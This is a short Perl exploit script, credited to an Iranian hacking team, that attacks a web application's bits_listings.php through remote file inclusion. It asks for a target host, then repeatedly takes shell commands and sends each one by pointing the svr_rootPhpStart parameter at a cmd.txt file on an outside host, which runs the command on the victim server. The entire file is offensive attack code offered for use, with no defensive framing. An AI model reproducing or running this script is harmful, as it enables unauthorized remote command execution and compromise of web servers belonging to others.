#!/usr/bin/perl
#
# Exploit by s3rv3r_hack3r
######################################################
# ___ ___ __ #
# / | \_____ ____ | | __ ___________________ #
#/ ~ \__ \ _/ ___\| |/ // __ \_ __ \___ / #
#\ Y // __ \\ \___| <\ ___/| | \// / #
# \___|_ /(____ )\___ >__|_ \\___ >__| /_____ \ #
# \/ \/ \/ \/ \/ \/ #
# Iran Hackerz Security Team #
# WebSite: www.hackerz.ir & www.h4ckerz.com
######################################################
use LWP::Simple;

print "-------------------------------------------\n";
print "= Iran hacekerz security team =\n";
print "= By s3rv3r_hack3r - www.hackerz.ir =\n";
print "-------------------------------------------\n\n";

print "Target >http://";
chomp($targ = <STDIN>);
print "your web site name >";
chomp($cmd= <STDIN>);


$con=get("http://".$targ."/bits_listings.php") || die "[-]Cannot connect to Host";
while ()
{
print "command\$";
chomp($cmd=<STDIN>);
$commd=get("http://".$targ."/bits_listings.php?svr_rootPhpStart=http://www.hackerz.ir/cmd.txt?cmd=".$cmd)
}

